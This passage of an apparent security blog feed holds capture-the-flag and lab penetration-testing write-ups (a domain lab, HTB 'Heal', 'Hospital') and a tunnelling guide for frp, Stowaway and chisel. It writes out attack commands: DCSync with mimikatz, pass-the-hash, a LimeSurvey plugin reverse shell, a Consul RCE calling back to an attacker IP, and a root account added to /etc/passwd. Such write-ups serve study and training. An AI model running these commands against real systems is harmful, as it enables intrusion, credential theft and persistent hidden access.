xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure><img src="/post/2feca376/IMAGE20250211184608177.png" class=""><h2 id="非约束委派-NtmlRelay-强制认证">非约束委派 + NtmlRelay 强制认证</h2><p>导入bloodhound看一下可以利用的东西可以看到有非约束委派</p><img src="/post/2feca376/IMAGE20250211191144321.png" class=""><p>参考<a href="https://forum.butian.net/share/1944">红队域渗透NTLM Relay：强制认证方式总结</a>，用DFSCoerce拿域控</p><p>ntmlrelay攻击原理：<br><a href="https://qingwan.top/2024/01/23/ntlm%20relay/">https://qingwan.top/2024/01/23/ntlm relay/</a><br><a href="https://www.geekby.site/2021/09/ntlm-relay/#3-%E5%AE%9E%E6%88%98">https://www.geekby.site/2021/09/ntlm-relay/#3-实战</a></p><p>先用Rubeus.exe监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p>然后使用dfscoerce强制访问获得域控的tgt导入lass</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dfscoerce.py -u win19$ -hashes &quot;aad3b435b51404eeaad3b435b51404ee:6b920c07d2b28ccb47de38f0a8edcb90&quot; -d xiaorang.lab win19 172.22.4.7</span><br></pre></td></tr></table></figure><img src="/post/2feca376/IMAGE20250211192849923.png" class=""><p>获得base64加密的tgt然后本地解密保存问kirbi，然后传一个mimikatz 上去导入进去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><img src="/post/2feca376/IMAGE20250211194346084.png" class=""><p>获取到hash然后打pth <code>4889f6553239ace1f7c47fa2c619c252</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.19</span><br></pre></td></tr></table></figure><img src="/post/2feca376/IMAGE20250211194812631.png" class=""><p>在横到另一台机器上去</p><img src="/post/2feca376/IMAGE20250211194906204.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;外网打点&quot;&gt;外网打点&lt;/h2&gt;
&lt;p&gt;利用 cve-2021-42643,直接访问路由/admin admin 123456登入后台&lt;/p&gt;
&lt;img src=&quot;/post/2feca376/IMAGE20250210180835438.png&quot; class=&quot;&quot;</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域渗透" scheme="https://oceanzbz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Heal-HTB</title>
    <link href="https://oceanzbz.github.io/post/b36a30b7.html"/>
    <id>https://oceanzbz.github.io/post/b36a30b7.html</id>
    <published>2025-02-05T14:42:52.000Z</published>
    <updated>2025-03-05T07:24:36.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p><code>nmap -sC -sV -T4 -Pn 10.10.11.48</code></p><img src="/post/b36a30b7/IMAGE20250205224902201.png" class=""><p>记得添加下host映射然后访问</p><p><code>ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -u http://heal.htb/ -H &quot;Host:FUZZ.heal.htb&quot;  -fc 301</code> 子域名爆破扫到一个api</p><img src="/post/b36a30b7/IMAGE20250205230525170.png" class=""><p>可以看到是用的ruby先记录留着</p><p>在<a href="http://heal.htb/suery%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%A0%E5%85%A5host%E9%87%8C%E9%9D%A2">http://heal.htb/suery看到一个新的子域名加入host里面</a></p><img src="/post/b36a30b7/IMAGE20250205225602378.png" class=""><p>访问一下发现一个用户名，先记录一下</p><img src="/post/b36a30b7/IMAGE20250205225943128.png" class=""><p>扫一下这个子域名的目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://take-survey.heal.htb/index.php/&quot;</span> -t <span class="number">50</span> -i <span class="number">200</span></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class="number">23</span>: DeprecationWarning: pkg_resources <span class="keyword">is</span> deprecated <span class="keyword">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"> </span><br><span class="line">  _|. _ _  _  _  _ _|_    v0<span class="number">.4</span><span class="number">.3</span>                                                                                                                            </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                     </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">50</span> | Wordlist size: <span class="number">11460</span></span><br><span class="line"> </span><br><span class="line">Output File: /home/kali/Desktop/reports/http_take-survey.heal.htb/_index.php__24-<span class="number">12</span>-<span class="number">15_19</span>-<span class="number">42</span>-<span class="number">06.</span>txt</span><br><span class="line"> </span><br><span class="line">Target: http://take-survey.heal.htb/</span><br><span class="line"> </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:06] Starting: index.php/                                                                                                                             </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">19</span>] <span class="number">200</span> -   75KB - /index.php/admin/mysql/index.php                  </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">23</span>] <span class="number">200</span> -   74KB - /index.php/apc/index.php                          </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">42</span>] <span class="number">200</span> -   74KB - /index.php/pma/index.php                          </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">54</span>] <span class="number">200</span> -   75KB - /index.php/web/phpMyAdmin/index.php </span><br></pre></td></tr></table></figure><p>访问admin会跳转到登录界面。有点慢先看其他的</p><h2 id="漏洞利用">漏洞利用</h2><p>在一开始登录进去的页面有一个导出pdf的功能抓包看看</p><img src="/post/b36a30b7/IMAGE20250205232534931.png" class=""><p>发现有download路由</p><img src="/post/b36a30b7/IMAGE20250205232512706.png" class=""><p>看看能不能任意文件下载</p><img src="/post/b36a30b7/IMAGE20250205232941769.png" class=""><p>发现可以又联想到之前ruby的页面去下载他的配置文件看看</p><img src="/post/b36a30b7/IMAGE20250205233037736.png" class=""><p>把这个sqlite文件下载下来</p><img src="/post/b36a30b7/IMAGE20250205233228765.png" class=""><p>解密下这个密码</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>得到密码：</p><img src="/post/b36a30b7/IMAGE20250205233641129.png" class=""><p>然后去登录后台因为ssh连接不上</p><img src="/post/b36a30b7/IMAGE20250205235801312.png" class=""><p>使用该exp进行利用<br><a href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a></p><p>这里需要更改一下xml文件添加一个compatibility版本为6.0的否则无法反弹shell</p><img src="/post/b36a30b7/IMAGE20250205235923595.png" class=""><p>然后打包上传压缩包</p><p><code>zip oceanzbz_zip config.xml php-rev.php</code></p><img src="/post/b36a30b7/IMAGE20250206000342816.png" class=""><p>然后激活访问<code>http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php</code></p><img src="/post/b36a30b7/IMAGE20250206001843600.png" class=""><p>查看配置文件</p><img src="/post/b36a30b7/IMAGE20250206002015928.png" class=""><p>发现密码，这里用ron用户登录。</p><img src="/post/b36a30b7/IMAGE20250206002138832.png" class=""><h2 id="提权">提权</h2><p>查看一下开放的端口</p><img src="/post/b36a30b7/IMAGE20250206002605309.png" class=""><p>开放了很多这里8500端口转发出来其他的我测试了发现不是http服务</p><p><code>ssh -L 8500:127.0.0.1:8500 ron@heal.htb </code></p><img src="/post/b36a30b7/IMAGE20250206002929198.png" class=""><p>随便点点找到信息泄漏版本</p><img src="/post/b36a30b7/IMAGE20250206003023013.png" class=""><p>然后利用脚本拿shell<br><a href="https://www.exploit-db.com/exploits/51117">https://www.exploit-db.com/exploits/51117</a><br><code> python3 Hashicorp_Consul_v1.0RCE_EXP.py 127.0.0.1 8500 10.10.16.25 1234 0</code><br>这里的acltoken随便填就行</p><img src="/post/b36a30b7/IMAGE20250206003436671.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap -sC -sV -T4 -Pn 10.10.11.48&lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;/post/b36a30b7/IMAGE20250205224902201.png&quot; class=&quot;&quot;&gt;
</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>内网穿透</title>
    <link href="https://oceanzbz.github.io/post/bd50b816.html"/>
    <id>https://oceanzbz.github.io/post/bd50b816.html</id>
    <published>2025-02-02T06:55:24.000Z</published>
    <updated>2025-03-05T07:24:36.815Z</updated>
    
    <content type="html"><![CDATA[<p>记录几个比较好用的内网穿透工具</p><h2 id="frp">frp</h2><p>这个是比较早的一款内网穿透工具了</p><h3 id="一级代理">一级代理</h3><p><strong>服务端（我们的VPS）</strong> <code>**frps.toml**</code> <strong>配置</strong></p><p>完整的配置可参考 <a href="https://github.com/fatedier/frp/blob/dev/conf/frps_full_example.toml">frps_full_example.toml</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bindPort = 49378</span><br><span class="line">auth.token = &quot;helloxx.6haha7789&quot;</span><br></pre></td></tr></table></figure><p>启动服务端命令<code>./frps -c frps.toml</code> 这里用toml配置文件是因为改版了ini配置文件在4.0的版本适用。</p><p><strong>客户端（shell机器）</strong><code>**frpc.toml**</code> <strong>配置</strong></p><p>完整配置可参考 <a href="https://github.com/fatedier/frp/blob/dev/conf/frpc_full_example.toml">frpc_full_example.toml</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;1.2.3.4&quot; </span><br><span class="line">serverPort = 49378</span><br><span class="line">auth.token = &quot;helloxx.6haha7789&quot;</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;plugin_socks5&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 60051</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br><span class="line">username = &quot;0HDFt16cLQJCB&quot;</span><br><span class="line">password = &quot;JTN276Gp1A&quot;</span><br></pre></td></tr></table></figure><p>启动客户端命令<code>./frpc -c frpc.toml</code><br>连接成功后，通过 <code>socks5://&lt;用户名&gt;:&lt;密码&gt;@&lt;服务端IP地址&gt;:&lt;服务端端口&gt;</code> 就可以直接代理进入到目标的内网了，可以访问任意内网资源、发起内网请求等。</p><h3 id="多级代理">多级代理</h3><p>在实战中，我们拿下了内网机器A，通过内网机器A又拿下了内网机器B，但发现内网机器A不通172段，内网机器B通172段但不出网，这时我们想要通过VPS构建socks5隧道访问到172段，就需要建立多级代理；简单图示如下：</p><img src="/post/bd50b816/IMAGE20250202150028600.png" class=""><p>服务端（外网VPS）配置<code>frps.toml</code>一级代理 一致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bindPort = 49378</span><br><span class="line">auth.token = &quot;helloxx.6haha7789&quot;</span><br></pre></td></tr></table></figure><p>由于客户端1（内网机器A）需要充当中转作用，即对于外网VPS来说是客户端，对于内网机器B来说是服务端，因此存在有2份配置文件，分别启动客户端和服务端。</p><p>其中服务端配置 <code>frps.toml</code> 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindPort = 49378</span><br></pre></td></tr></table></figure><p>客户端配置<code>frpc.toml</code>如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;1.2.3.4&quot; # 改为 VPS 的 IP 地址</span><br><span class="line">serverPort = 49378</span><br><span class="line">auth.token = &quot;helloxx.6haha7789&quot;</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;plugin_socks5&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 60051</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br><span class="line">username = &quot;0HDFt16cLQJCB&quot;</span><br><span class="line">password = &quot;JTN276Gp1A&quot;</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;portforward&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">localIP = &quot;127.0.0.1&quot;</span><br><span class="line">remotePort = 60052 # 别和上方的remotePort冲突就行</span><br><span class="line">localPort = 6000 # 把本地的6000端口映射出去</span><br></pre></td></tr></table></figure><p>接下来在客户端2（内网机器B）上配置 <code>frpc.toml</code> 如下，和客户端1（内网机器A）建立隧道。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;1.2.3.5&quot; # 改为 内网机器A 的地址</span><br><span class="line">serverPort = 49378</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;plugin_socks5_two&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 6000 # 修改为上面的 localPort，表明通过 内网机器A 的该端口可以访问到当前的内网</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br><span class="line">username = &quot;0HDFt16cLQJCB&quot;</span><br><span class="line">password = &quot;JTN276Gp1A&quot;</span><br></pre></td></tr></table></figure><p>这样一套启动下来后，通过外网VPS <code>socks5://&lt;账号&gt;:&lt;密码&gt;@&lt;外网VPS IP地址&gt;:60052</code> 就可以访问到客户端2（内网机器B）的内网了。</p><h2 id="Stowaway">Stowaway</h2><p><a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a>是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具，用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能；用于解决frp，nps等工具在搭建多级代理时操作过于复杂不便管理的问题。</p><h3 id="一级代理-2">一级代理</h3><p>目标内网全部连通，只需要构建隧道进入到内网即可访问到所有的资源。</p><p>在服务端（VPS）启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stowaway_linux_x64_admin --heartbeat -l 61032 -s aab32</span><br></pre></td></tr></table></figure><p>在被控端（shell机器）启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stowaway_macos_x64_agent -c &lt;VPS IP地址&gt;:61032 -s aab32</span><br></pre></td></tr></table></figure><p>建立连接后，在服务端选中上线的节点，并且执行socks命令即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">socks 端口 用户名 密码</span></span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure><p>此时使用 <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> 就可以代理到被控端的内网了。</p><h3 id="多级代理-2">多级代理</h3><p>外网VPS上执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stowaway_linux_x64_admin --heartbeat -l 61032 -s aab32</span><br></pre></td></tr></table></figure><p>内网机器A上执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stowaway_linux_x64_admin -c &lt;VPS IP地址&gt;:61032 -s aab32</span><br></pre></td></tr></table></figure><p>这时候外网VPS和内网机器A已经建立连接了，进入内网机器A的node节点，执行listen监听端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">listen</span><br></pre></td></tr></table></figure><img src="/post/bd50b816/IMAGE20250202150355957.png" class=""><p>此时再在内网机器B上执行如下命令和内网机器A建立连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stowaway_macos_x64_agent -c &lt;内网机器A IP地址&gt;:23123 -s aab32</span><br></pre></td></tr></table></figure><p>执行后可以在外网VPS上看到内网机器B已经上线，这个时候进入该节点再执行socks命令开启代理即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 1</span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure><p>此时即可通过 <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> 访问到内网机器B的内网了。</p><h2 id="chisel">chisel</h2><p><a href="%5Bhttps://github.com/jpillora/chisel/releases%5D(https://github.com/jpillora/chisel/releases)">chisel</a>是一款基于HTTP的快速TCP/UDP隧道工具，具有SSH加密和断开重连机制，使用Go语言编写，支持多平台，且单一文件无依赖。该工具可以在攻击者和受害者之间建立连接，用于代理和访问特定端口。通过设置socks5代理，可以访问内部服务器。该工具还支持反向连接和二级代理。</p><h3 id="一级代理-3">一级代理</h3><p><strong>攻击者（kali）：</strong> 192.168.6.131<br><strong>受害者（windows）：</strong> 192.168.6.129</p><p><strong>拓扑如下：</strong></p><p>攻击者（192.168.6.131）&lt;–&gt; 受害者（192.168.6.129,10.1.1.1）&lt; – &gt; 内部服务器 (10.1.1.2)</p><p><strong>目标访问：</strong> 10.1.1.2</p><blockquote><p>正向连接（socks）</p></blockquote><p>跳板机（受害者）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 12345</span><br></pre></td></tr></table></figure><img src="/post/bd50b816/IMAGE20250202150738074.png" class=""><p>攻击者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.6.129:12345 socks</span><br></pre></td></tr></table></figure><img src="/post/bd50b816/IMAGE20250202150726352.png" class=""><p>socks 代理绑定在了 1080 端口上，本地只要设置 socks5 代理就可以访问。</p><blockquote><p>反向连接</p></blockquote><p>攻击者（黑客）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 12345 --reverse --socks5</span><br></pre></td></tr></table></figure><p>跳板机（受害者）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel.exe client 192.168.6.128:12345 R:socks</span><br></pre></td></tr></table></figure><p>此时攻击者通过设置socks代理就可以访问10.1.1.2的服务了</p><h3 id="多级代理-3">多级代理</h3><img src="/post/bd50b816/IMAGE20250202150926916.png" class=""><h4 id="访问特定端口">访问特定端口</h4><p><strong>attack kali：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel  server -p 3333 --reverse</span><br></pre></td></tr></table></figure><p><strong>web01:</strong></p><p>开启两个终端，既要运行 client 也要运行 server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 2222 --reverse</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client 192.168.126.132:3333 R:1111:127.0.0.1:5555</span><br></pre></td></tr></table></figure><p>这里解释一下这里的R:1111是什么意思，指的是在kali端开启1111端口也就是说kali端开启socks代理通过访问1111就会访问到web01端的5555的端口上。</p><p><strong>web02:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client 192.168.150.128:2222 R:5555:192.168.59.129:80</span><br></pre></td></tr></table></figure><p>这里的R:5555的意思也很明显就是在web01开启5555端口当访问web01的5555端口就能访问到web02的80端口所以在 kali 上访问 127.0.0.1:1111，即可访问 192.168.59.129 的 80 端口。</p><h4 id="socks代理">socks代理</h4><p><strong>kali:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 3333 --reverse</span><br></pre></td></tr></table></figure><p><strong>web01:</strong></p><p>开启两个终端，既要运行 client 也要运行 server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 2222 --reverse --socks5</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client 192.168.126.132:3333 R:1111:socks</span><br></pre></td></tr></table></figure><p><strong>web02:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client 192.168.150.128:2222 R:5555:socks</span><br></pre></td></tr></table></figure><p><strong>proxychains.conf 文件设置代理链</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1111</span><br><span class="line">socks5 127.0.0.1 5555</span><br></pre></td></tr></table></figure><p>后续如果还有多级代理只需重复在web01上的步骤即可然后记得要在<strong>proxychains.conf</strong>添加上代理链<br>参考：<br><a href="https://f0rget.me/2023/09/02/chisel-proxy/">https://f0rget.me/2023/09/02/chisel-proxy/</a><br><a href="https://lca.xlog.page/chisel-dai-li-gong-ju?locale=zh">https://lca.xlog.page/chisel-dai-li-gong-ju?locale=zh</a><br><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html#%E4%B8%80%E7%BA%A7%E4%BB%A3%E7%90%86">https://blog.gm7.org/个人知识库/01.渗透测试/12.内网渗透/03.内网穿透/03.内网穿透.html#一级代理</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录几个比较好用的内网穿透工具&lt;/p&gt;
&lt;h2 id=&quot;frp&quot;&gt;frp&lt;/h2&gt;
&lt;p&gt;这个是比较早的一款内网穿透工具了&lt;/p&gt;
&lt;h3 id=&quot;一级代理&quot;&gt;一级代理&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;服务端（我们的VPS）&lt;/strong&gt; &lt;code&gt;**frps.to</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网穿透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Hospital-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/1fe67be2.html"/>
    <id>https://oceanzbz.github.io/post/1fe67be2.html</id>
    <published>2025-02-02T05:13:56.000Z</published>
    <updated>2025-03-05T12:38:05.517Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p><code>python dirsearch.py  -u 39.98.109.138:8080</code></p><img src="/post/1fe67be2/IMAGE20250202190540331.png" class=""><p>可以看到有headump直接dump下来分析一波</p><img src="/post/1fe67be2/IMAGE20250202190919994.png" class=""><p>存在shiro框架找到了shirokey 找漏洞利用工具弹shell</p><h2 id="漏洞利用">漏洞利用</h2><p>直接使用shiro漏洞利用工具反弹shell或者注入内存马都行，这里直接注入冰蝎内存马，然后连接</p><img src="/post/1fe67be2/IMAGE20250202191444708.png" class=""><img src="/post/1fe67be2/IMAGE20250202191521903.png" class=""><h2 id="suid提权">suid提权</h2><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><img src="/post/1fe67be2/IMAGE20250202191646207.png" class=""><p>利用vim.basic查看文件<br><code>vim.basic /root/flag/flag01.txt</code></p><img src="/post/1fe67be2/IMAGE20250202192057091.png" class=""><p>有了这个能编辑文件加个特权账户,使用pwncat终端重新接收shell</p><img src="/post/1fe67be2/IMAGE20250202195249191.png" class=""><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">back                                                      #返回shell  </span><br><span class="line">vim.basic /etc/passwd                                     #利用提权文件编辑passwd文件  </span><br><span class="line">i                                                         #进入编辑模式  </span><br><span class="line">hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash  #创建用户hacker/123456  </span><br><span class="line">wq!                                                       #强制保存退出  </span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure><h2 id="内网渗透">内网渗透</h2><p>上传fscan 扫描内网</p><img src="/post/1fe67be2/IMAGE20250202192653282.png" class=""><p>内网存在一个 nacos漏洞下载漏洞利用工具<a href="https://github.com/charonlight/NacosExploitGUI">charonlight/NacosExploitGUI</a>。编辑NacosExploitGUI-main\漏洞复现环境\nacos-client_yaml_deserialize\yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java</p><img src="/post/1fe67be2/IMAGE20250202195705638.png" class=""><p>修改其文件为添加管理员用户</p><img src="/post/1fe67be2/IMAGE20250202200123539.png" class=""><p>根据他的bat里的命令重新编译一下会生成一个jar包，用冰蝎把它上传到受害机，然后用python开一个服务利用漏洞利用工具进行利用。</p><h3 id="内网穿透">内网穿透</h3><p>在利用之前先把代理搭起来用Stowaway<br>攻击端</p><img src="/post/1fe67be2/IMAGE20250202200935647.png" class=""><p>受害端</p><img src="/post/1fe67be2/IMAGE20250202200954886.png" class=""><p>搭建socks代理</p><img src="/post/1fe67be2/IMAGE20250202201023456.png" class=""><h3 id="漏洞利用-2">漏洞利用</h3><p>然后在tmp目录下起一个http服务结合漏洞利用框架进行利用</p><img src="/post/1fe67be2/IMAGE20250202201254878.png" class=""><p><img src="Hospital/IMAGE20250202201247123.png" alt=""><img src="Hospital/IMAGE20250202201642615.png" alt=""><br>看看能否直接rdp上去</p><img src="/post/1fe67be2/IMAGE20250202202028087.png" class=""><p>拿到第二个flag</p><p>前面在fscan扫描的时候还看到一个172.30.12.236:8080开启了一个服务访问看看，抓包</p><img src="/post/1fe67be2/IMAGE20250202203044397.png" class="">有json特征应该是是fastjson漏洞，测试一下发现了<img src="/post/1fe67be2/IMAGE20250202203157646.png" class=""><img 